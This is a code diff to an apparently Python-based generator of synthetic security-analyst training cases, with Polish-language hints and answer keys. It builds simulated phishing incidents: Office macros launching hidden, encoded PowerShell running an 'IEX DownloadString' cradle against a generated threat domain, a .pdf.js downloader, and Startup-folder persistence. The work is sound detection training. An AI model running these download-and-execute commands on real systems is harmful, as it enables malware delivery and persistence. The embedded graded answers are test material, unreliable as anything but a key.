@@ -48,6 +48,8 @@ LESSONS_PS = Lessons(
         "Samo „-enc” nie jest dowodem. Legalne narzędzia administracyjne też go używają.",
         "Samo „SYSTEM” nie oznacza legalności. Patrz na rodzica i cel działania.",
         "Brak wpisu w TI to nie to samo co „bezpieczna”. Sprawdź wiek domeny i to, ilu użytkowników ją odwiedziło.",
+        "Czysta reputacja miejsca docelowego niczego nie dowodzi: payload może leżeć w legalnej usłudze (Azure Blob, S3, GitHub raw) albo na starej, "
+        "podszytej domenie. Oceniaj proces, jego rodzica i polecenie, a nie sam wskaźnik.",
     ],
     attack=["T1059.001 PowerShell", "T1027 Obfuscated Files or Information", "T1204.002 User Execution: Malicious File",
             "T1105 Ingress Tool Transfer"],
@@ -74,48 +76,49 @@ def _ps_tp(b: Builder) -> None:
     b.at_hour(rng.choice([9, 10, 11, 13, 14, 15, 2, 3]))
     p = b.person(rng.choice(["Księgowość", "HR", "Sprzedaż"]))
     sess = b.session(p)
-    domain, ip = w.bad_domain(), w.attacker_ip()
-    sender_domain = w.bad_domain()
-    url = f"https://{domain}/a/update.ps1"
+    remote = b.threat()
+    domain, ip = remote.name, w.attacker_ip()
+    sender_domain = b.threat(site_only=True).name
+    url = remote.url("a/update.ps1")
     payload = f"IEX ((New-Object Net.WebClient).DownloadString('{url}'))"
     enc = _b64(payload)
-    attachment = "Faktura_VAT_03_2026.docm"
+    office, attachment = rng.choice([("WINWORD.EXE", "Faktura_VAT_03_2026.docm"), ("EXCEL.EXE", "Zestawienie_nalezności_03_2026.xlsm")])
 
     spf_fail = not b.hard
     b.add(src.mail(b.t(-11), f"ksiegowosc@{sender_domain}", p.upn, "Zaległa faktura VAT, ostateczne wezwanie do zapłaty",
                    attachment, spf="fail" if spf_fail else "pass", dkim="none" if spf_fail else "pass",
                    dmarc="fail" if spf_fail else "pass", sender_ip=w.attacker_ip())).key(
-        "Wiadomość z domeny spoza organizacji, z załącznikiem .docm i presją czasu. "
+        "Wiadomość z domeny spoza organizacji, z załącznikiem z makrem i presją czasu. "
         + ("SPF/DKIM/DMARC nie przechodzą." if spf_fail else
            "SPF przechodzi, ale tylko dlatego, że atakujący skonfigurował go dla własnej domeny. Przejście SPF nie oznacza zaufania."))
     doc = rf"{p.profile}\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\{rng.randint(1000, 9999)}ABC\{attachment}"
-    _, word = b.spawn(sess["outlook"], r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
-                      f'"WINWORD.EXE" /n "{doc}"', b.t(-4), p.host, p.sam, signer="Microsoft Corporation", cwd=p.profile)
+    _, word = b.spawn(sess["outlook"], rf"C:\Program Files\Microsoft Office\root\Office16\{office}",
+                      f'"{office}" "{doc}"', b.t(-4), p.host, p.sam, signer="Microsoft Corporation", cwd=p.profile)
     ev, cmd = b.spawn(word, CMD, f"cmd.exe /c powershell.exe -nop -w hidden -ep bypass -enc {enc}", b.t(-0.5), p.host, p.sam)
-    ev.key("WINWORD.EXE uruchamia cmd.exe. Makro w dokumencie odpaliło powłokę, czego Word nie robi w normalnej pracy.")
+    ev.key(f"{office} uruchamia cmd.exe. Makro w dokumencie odpaliło powłokę, czego aplikacja biurowa nie robi w normalnej pracy.")
     trigger, ps = b.spawn(cmd, PS, f"powershell.exe -nop -w hidden -ep bypass -enc {enc}", b.t(0), p.host, p.sam)
     trigger.key(f"Po zdekodowaniu: {payload}. Pobranie i wykonanie kodu z internetu, ukryte okno, bez profilu, z ominięciem polityki.")
     b.add(src.dns(b.t(0, 2), p.ip, domain, "A", "NOERROR", ip, host=p.host))
     b.add(src.sysmon_net(b.t(0, 3), p.host, p.netbios, PS, ps.pid, ip, 443, domain, src_ip=p.ip)).key(
-        f"powershell.exe łączy się z nieznaną domeną {domain} zaraz po starcie. To jest etap pobierania.")
+        f"powershell.exe, a nie przeglądarka, łączy się z {domain} zaraz po starcie ({remote.blurb}). To jest etap pobierania. "
+        "Reputacja miejsca docelowego jest drugorzędna: o ocenie decyduje proces, który się łączy, i jego rodzic.")
     if not b.hard:
         b.add(src.proxy(b.t(0, 4), p.ip, p.sam, "GET", url, 200, 412, 18_432,
                         ua="Mozilla/5.0 (Windows NT; Windows NT 10.0; pl-PL) WindowsPowerShell/5.1.22621.2506",
-                        category="Newly Registered Domain", content_type="text/plain", host=p.host)).key(
-            "User-Agent „WindowsPowerShell” i kategoria „Newly Registered Domain”: skrypt faktycznie został pobrany (200, 18 KB).")
+                        category=remote.category, content_type="text/plain", host=p.host)).key(
+            "User-Agent „WindowsPowerShell” zamiast przeglądarki: skrypt faktycznie został pobrany (200, 18 KB) przez powłokę, nie przez użytkownika.")
     b.add(src.sysmon_file(b.t(0, 40), p.host, p.netbios, PS, ps.pid,
                           rf"{p.profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk")).key(
         "Skrót w folderze Autostart o nazwie udającej OneDrive. Ustanowiona persystencja.")
-    b.ti_bad(domain, "domena", age_days=2, tags="downloader, phishing")
-    b.ti_bad(ip, "IP", age_days=2, tags="hosting, C2")
+    b.ti_threat(remote, ip=ip, tags="downloader, phishing", ip_tags="hosting, C2")
     noise(b, involved=[p])
     truth = b.truth(
         "tp", "high",
-        f"Fałszywa faktura (.docm) z domeny {sender_domain} uruchomiła makro: WINWORD → cmd → ukryty PowerShell. Zdekodowany "
-        f"payload pobiera i wykonuje skrypt z świeżej domeny {domain}. Host ma persystencję w Autostarcie, użytkownik jest zainfekowany.",
-        f"TP. {p.host} ({p.sam}): WINWORD.EXE → cmd.exe → powershell -nop -w hidden -ep bypass -enc. Payload: IEX DownloadString "
+        f"Fałszywa faktura ({attachment}) z domeny {sender_domain} uruchomiła makro: {office} → cmd → ukryty PowerShell. Zdekodowany "
+        f"payload pobiera i wykonuje skrypt z {domain} ({remote.blurb}). Host ma persystencję w Autostarcie, użytkownik jest zainfekowany.",
+        f"TP. {p.host} ({p.sam}): {office} → cmd.exe → powershell -nop -w hidden -ep bypass -enc. Payload: IEX DownloadString "
         f"{url}. Połączenie z {ip}:443, utworzony skrót Startup\\OneDriveSync.lnk. Źródło: mail od {sender_domain}, "
-        f"załącznik {attachment}. Eskaluję do L2, proszę o izolację hosta i blokadę domeny/IP. Do sprawdzenia: inni odbiorcy tej wiadomości.",
+        f"załącznik {attachment}. Eskaluję do L2, proszę o izolację hosta i blokadę adresu/domeny. Do sprawdzenia: inni odbiorcy tej wiadomości.",
         required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
     b.finish(trigger, source="SIEM", rule="Suspicious PowerShell: encoded command", severity="high",
              description=f"powershell.exe uruchomiony z parametrem -EncodedCommand na hoście {p.host}.", truth=truth,
@@ -365,12 +368,13 @@ def persistence_task(b: Builder, variant: str) -> None:
         b.at_hour(rng.choice([10, 11, 14, 15, 1]))
         p = b.person()
         sess = b.session(p)
-        domain = w.bad_domain()
+        remote = b.threat()
+        domain = remote.name
         script = rf"{p.profile}\AppData\Roaming\Microsoft\upd.ps1"
         js = rf"{p.profile}\Downloads\Faktura_marzec.pdf.js"
         b.add(src.sysmon_file(b.t(-6), p.host, p.netbios, r"C:\Program Files\Google\Chrome\Application\chrome.exe", sess["chrome"].pid, js))
-        b.add(src.sysmon_motw(b.t(-6, 1), p.host, p.netbios, js, f"https://{domain}/f/faktura", referrer="https://mail.example/")).key(
-            f"Plik pobrany z Internetu ({domain}). Podwójne rozszerzenie .pdf.js ma udawać dokument.")
+        b.add(src.sysmon_motw(b.t(-6, 1), p.host, p.netbios, js, remote.url("f/faktura"), referrer="https://mail.example/")).key(
+            f"Plik pobrany z Internetu ({domain}: {remote.blurb}). Podwójne rozszerzenie .pdf.js ma udawać dokument.")
         ev, wsh = b.spawn(sess["explorer"], r"C:\Windows\System32\wscript.exe", rf'"C:\Windows\System32\wscript.exe" "{js}"',
                           b.t(-4), p.host, p.sam, cwd=rf"{p.profile}\Downloads")
         ev.key("Użytkownik uruchomił skrypt JavaScript przez wscript.exe z folderu Pobrane.")
@@ -390,7 +394,7 @@ def persistence_task(b: Builder, variant: str) -> None:
         ip = w.attacker_ip()
         b.add(src.sysmon_net(b.t(15, 2), p.host, p.netbios, PS, w.pid(), ip, 443, domain, src_ip=p.ip)).key(
             "Po 15 minutach zadanie uruchamia się i łączy z tą samą domeną co plik JS. Persystencja działa.")
-        b.ti_bad(domain, "domena", age_days=4, tags="downloader")
+        b.ti_threat(remote, ip=ip, tags="downloader")
         noise(b, involved=[p])
         truth = b.truth(
             "tp", "high",
